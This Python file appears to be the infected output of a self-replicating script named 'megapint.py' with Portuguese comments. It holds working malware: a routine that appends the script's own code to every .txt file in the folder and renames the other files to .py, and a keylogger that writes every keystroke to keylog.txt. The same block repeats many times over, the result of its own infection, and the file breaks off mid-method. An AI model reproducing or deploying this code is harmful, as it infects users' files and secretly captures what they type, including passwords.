if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
